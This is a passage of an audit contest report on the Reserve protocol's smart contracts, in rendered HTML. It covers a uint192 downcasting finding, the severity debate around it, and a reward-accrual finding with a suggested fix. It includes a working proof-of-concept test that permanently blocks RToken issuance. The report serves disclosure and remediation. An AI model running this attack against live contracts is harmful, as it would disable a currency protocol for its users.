3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Permanent DoS would be High risk considering RToken is an asset-backed <strong>currency</strong>.<br>\n<em>A currency that is unable to issue new currency does not work as a currency</em></p>\n<p>Also, I believe existing collateral cannot be redeemed due to the extreme values also used in <code>redeem(...)</code> function. No PoC written due to time constriant for this case… but above should be enough impact.</p>\n<p>Many other downcasting issues for this project. But using a safe casting library would prevent all the issues… not going to write multiple reports for same underlying issue.</p>\n<h3 id=\"recommendations\" style=\"position:relative;\"><a href=\"#recommendations\" aria-label=\"recommendations permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendations</h3>\n<p>Use some safe casting library. OpenZeppelin’s library does not have safe casting for <code>uint192</code> type. May have to find another or write your own.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/320#issuecomment-1399385997\">0xean (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>Will leave open for sponsor review, I think Medium severity is correct if the finding turns out to be fully valid. If no more issuance can occur, redemption is still possible. Warden would have needed to demonstrate a loss of funds for this to qualify as H severity. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/320#issuecomment-1405572151\">tbrent (Reserve) disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>We have supported ranges of value. See <code>docs/solidity-style.md</code>. </p>\n<p>The only mistake here is that <code>issue()</code> has somewhat lacking in-line documentation:<br></p>\n<blockquote>\n<p>Downcast is safe because an actual quantity of qBUs fits in uint192</p>\n</blockquote>\n<p>The comment in <code>redeem()</code> is a bit better:<br></p>\n<blockquote>\n<p>// downcast is safe: amount &#x3C; totalSupply and basketsNeeded_ &#x3C; 1e57 &#x3C; 2^190 (just barely)</p>\n</blockquote>\n<p>We’ll probably improve the comment in <code>issue()</code> to match <code>redeem()</code>. This should be a QA-level issue. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/320#issuecomment-1399385997\">0xean (judge) decreased severity to Low/Non-Critical</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/320#issuecomment-1420413631\">Soosh (warden) commented</a>:</strong></p>\n<blockquote>\n<p>I don’t see how documentation prevents this issue. </p>\n<p>The issue exists because downcasting values above 2^192 does not revert. Maybe the sponsor misunderstood the issue thinking that it would require the attacker to deposit 2^192 of the collateral in order for the attack to succeed which is an extremely unlikely scenario.</p>\n<p>Updated the PoC to clearly show that the attacker can permanently disable the <code>issue(...)</code> function for the protocol, without owning any amount of the basket token. - addr1 is the attacker with 0 basket tokens, addr2 represents all future users who will not be able to issue new RTokens.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"46\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">it</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;Audit: DoS by downcasting&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">issueAmount</span><span class=\"mtk1\">: </span><span class=\"mtk10\">BigNumber</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">BigNumber</span><span class=\"mtk1\">.</span><span class=\"mtk11\">from</span><span class=\"mtk1\">(</span><span class=\"mtk7\">2</span><span class=\"mtk4\">n</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">192</span><span class=\"mtk4\">n</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token0</span><span class=\"mtk1\">.</span><span class=\"mtk11\">burn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk11\">bn</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;6.3e57&#39;</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token0</span><span class=\"mtk1\">.</span><span class=\"mtk11\">burn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr2</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk11\">bn</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;6.3e57&#39;</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// await token0.mint(addr1.address, bn(&#39;10e18&#39;))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token0</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr2</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk11\">bn</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;10e18&#39;</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token0</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">)).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk11\">eq</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token0</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr2</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">)).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk11\">eq</span><span class=\"mtk1\">(</span><span class=\"mtk11\">bn</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;10e18&#39;</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// Set basket</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">basketHandler</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">setPrimeBasket</span><span class=\"mtk1\">([</span><span class=\"mtk12\">token0</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">], [</span><span class=\"mtk11\">fp</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;1&#39;</span><span class=\"mtk1\">)])</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">basketHandler</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">refreshBasket</span><span class=\"mtk1\">()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// Attacker issues 2 ** 192, or a multiple of 2 ** 192 RTokens</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// This will cause allVestAt to be very high, permanent DoS</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tx</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr1</span><span class=\"mtk1\">)[</span><span class=\"mtk8\">&#39;issue(uint256)&#39;</span><span class=\"mtk1\">](</span><span class=\"mtk12\">issueAmount</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">receipt</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tx</span><span class=\"mtk1\">.</span><span class=\"mtk11\">wait</span><span class=\"mtk1\">()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk12\">receipt</span><span class=\"mtk1\">.</span><span class=\"mtk12\">events</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">].</span><span class=\"mtk12\">args</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token0</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr2</span><span class=\"mtk1\">).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk11\">bn</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;10e18&#39;</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tx2</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr2</span><span class=\"mtk1\">)[</span><span class=\"mtk8\">&#39;issue(uint256)&#39;</span><span class=\"mtk1\">](</span><span class=\"mtk11\">bn</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;10e18&#39;</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">receipt2</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tx2</span><span class=\"mtk1\">.</span><span class=\"mtk11\">wait</span><span class=\"mtk1\">()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk12\">receipt2</span><span class=\"mtk1\">.</span><span class=\"mtk12\">events</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">].</span><span class=\"mtk12\">args</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// one eternity later...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">advanceTime</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;123456789123456789&#39;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// and still not ready</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr2</span><span class=\"mtk1\">).</span><span class=\"mtk11\">vest</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr2</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        .</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">revertedWith</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;issuance not ready&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    })</span></span></span></code></pre>\n<p>Additionally, I still believe this issue should be considered High risk as:</p>\n<ol>\n<li>Disabling of critical function of the protocol</li>\n<li>Attack is very simple to exploit, with no cost to the attacker - Low complexity with High likelihood</li>\n<li>Permanent disabling of RToken issuance means that the <strong>RToken can no longer be used</strong> so all funds must be moved out, this will entail:</li>\n<li>Redeeming all existing RTokens, which will take a reasonable amount of time depending on redemption battery parameters</li>\n<li>Unstaking all stRSR which will take a reasonable amount of time depending on unstaking delay</li>\n<li>Gas costs for all the above redeeming and unstaking will be in the thousands for a RToken with reasonable market cap. </li>\n<li>RToken is a stable currency which means that it would be used in DeFi protocols. In the case of Lending/Borrowing, it would take even longer for RToken to be redeemed. There may also be loss of funds as a long wait time to redeem RTokens means that the RToken will trade at a discount in secondary markets - this can cause RToken-collateralized loans to be underwater.</li>\n</ol>\n<p>There is no <strong>direct</strong> loss of funds but I’d argue the impact is vast due to RToken being used as a currency.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/320#issuecomment-1420866210\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Thanks for the response.  </p>\n<blockquote>\n<p>There is no direct loss of funds but I’d argue the impact is vast due to RToken being used as a currency.</p>\n</blockquote>\n<p>If there is no direct loss of funds, how can this issue be High per the C4 criteria, not your own opinion?</p>\n<p>I will ask @tbrent to take another look at your POC and do the same as well. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/320#issuecomment-1420954105\">Soosh (warden) commented</a>:</strong></p>\n<blockquote>\n<p>I agree with Medium if following C4 criteria in the docs exactly word for word.</p>\n<p>It is just that there are many High findings in previous contests where High findings did not need to cause direct loss of funds, but break an important functionality in the protocol.</p>\n<p>To be clear, this issue does lead to loss of funds. It is just that it may not be considered <strong>direct</strong>.</p>\n<p>It is indeed my opinion that the finding should be High, but the points listed below are all facts. I will respect your decision regardless. Thanks!</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/320#issuecomment-1421058666\">tbrent (Reserve) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Apologies, I misunderstood the issue the first time I read through it…indeed this can be used to mint large amounts of RToken to yourself while putting down very little in collateral, while pushing <code>allVestAt</code> extremely far into the future. </p>\n<p>Since <code>issuanceRate</code> cannot be disabled, and cannot be above 100%, there is no way for the absurdly high RToken mint to finish vesting. In the event of the attack, RToken issuance would be bricked but redemption would remain enabled, and since no RToken is minted until vesting the redemptions would still function. I think this is a Medium. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/320#issuecomment-1421336734\">0xean (judge) increased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>Thanks for all the conversation, marking as Medium. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest#mitigations-to-be-reviewed\">tbrent (Reserve) mitigated</a>:</strong></p>\n<blockquote>\n<p>This PR makes all dangerous uint192 downcasts truncation-safe: <a href=\"https://github.com/reserve-protocol/protocol/pull/628\">reserve-protocol/protocol#628</a></p>\n</blockquote>\n<p><strong>Status:</strong> Mitigation confirmed. Full details in reports from <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/19\">HollaDieWaldfee</a>, <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/56\">0xA5DF</a>, and <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/33\">AkshaySrivastav</a>.</p>\n<hr>\n<h2 id=\"m-11-should-accrue-before-change-loss-of-rewards-in-case-of-change-of-settings\" style=\"position:relative;\"><a href=\"#m-11-should-accrue-before-change-loss-of-rewards-in-case-of-change-of-settings\" aria-label=\"m 11 should accrue before change loss of rewards in case of change of settings permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/287\">[M-11] Should Accrue Before Change, Loss of Rewards in case of change of settings</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/287\">GalloDaSballo</a>, also found by <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/380\">chaduke</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/333\">__141345__</a>, and <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/330\">__141345__</a></em></p>\n<p>In <code>StRSR.sol</code>, <code>_payoutRewards</code> is used to accrue the value of rewards based on the time that has passed since <code>payoutLastPaid</code></p>\n<p>Because of it’s dependence on <code>totalStakes</code>, <code>stakeRate</code> and time, the function is rightfully called on every <code>stake</code> and <code>unstake</code>.</p>\n<p>There is a specific instance, in which <code>_payoutRewards</code> should also be called, which could create either an unfair reward stream or a governance attack and that’s when <code>setRewardPeriod</code> and <code>setRewardRatio</code> are called.</p>\n<p>If you imagine the ratio at which rewards are paid out as a line, then you can see that by changing <code>rewardRatio</code> and <code>period</code> you’re changing it’s slope.</p>\n<p>You should then agree, that while governance can <em>rightfully</em> change those settings, it should <code>_payoutRewards</code> first, to ensure that the slope of rewards changes only for rewards to be distributed after the setting has changed.</p>\n<h3 id=\"mitigation\" style=\"position:relative;\"><a href=\"#mitigation\" aria-label=\"mitigation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Mitigation</h3>\n<p>Functions that change the slope or period size should accrue rewards up to that point.</p>\n<p>This is to avoid:</p>\n<ul>\n<li>Incorrect reward distribution</li>\n<li>Change (positive or negative) of rewards from the past</li>\n</ul>\n<p>Without accrual, the change will apply retroactively from <code>payoutLastPaid</code></p>\n<p>Which could:</p>\n<ul>\n<li>Change the period length prematurely</li>\n<li>Start a new period inadvertently</li>\n<li>Cause a gain or loss of yield to stakers</li>\n</ul>\n<p>Instead of starting a new period</p>\n<h3 id=\"suggested-refactoring\" style=\"position:relative;\"><a href=\"#suggested-refactoring\" aria-label=\"suggested refactoring permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Suggested Refactoring</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"47\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setRewardPeriod</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint48</span><span class=\"mtk1\"> </span><span class=\"mtk12\">val</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">governance</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">val</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">val</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">MAX_REWARD_PERIOD</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;invalid rewardPeriod&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_payoutRewards</span><span class=\"mtk1\">(); </span><span class=\"mtk3\">// @audit Payout rewards for fairness</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">RewardPeriodSet</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rewardPeriod</span><span class=\"mtk1\">, </span><span class=\"mtk12\">val</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">rewardPeriod</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">val</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rewardPeriod</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">2</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">unstakingDelay</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;unstakingDelay/rewardPeriod incompatible&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setRewardRatio</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint192</span><span class=\"mtk1\"> </span><span class=\"mtk12\">val</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">governance</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">val</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">MAX_REWARD_RATIO</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;invalid rewardRatio&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_payoutRewards</span><span class=\"mtk1\">(); </span><span class=\"mtk3\">// @audit Payout rewards for fairness</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">RewardRatioSet</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rewardRatio</span><span class=\"mtk1\">, </span><span class=\"mtk12\">val</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">rewardRatio</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">val</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/287#issuecomment-1404391327\">tbrent (Reserve) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Nice finding, agree. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest#mitigations-to-be-reviewed\">tbrent (Reserve) mitigated</a>:</strong></p>\n<blockquote>\n<p>This PR adds a <code>Furnace.melt()</code>/<code>StRSR.payoutRewards()</code> step when governance changes the <code>rewardRatio</code>: <a href=\"https://github.com/reserve-protocol/protocol/pull/622\">reserve-protocol/protocol#622</a></p>\n</blockquote>\n<p><strong>Status:</strong> Mitigation confirmed with comments. Full details in reports from <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/18\">HollaDieWaldfee</a>, <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/57\">0xA5DF</a>, and <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/34\">AkshaySrivastav</a>.</p>\n<hr>\n<h2 id=\"m-12-backingmanager-rsr-is-distributed-across-all-rsr-revenue-destinations-which-is-a-loss-for-rsr-stakers\" style=\"position:relative;\"><a href=\"#m-12-backingmanager-rsr-is-distributed-across-all-rsr-revenue-destinations-which-is-a-loss-for-rsr-stakers\" aria-label=\"m 12 backingmanager rsr is distributed across all rsr revenue destinations which is a loss for rsr stakers permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path 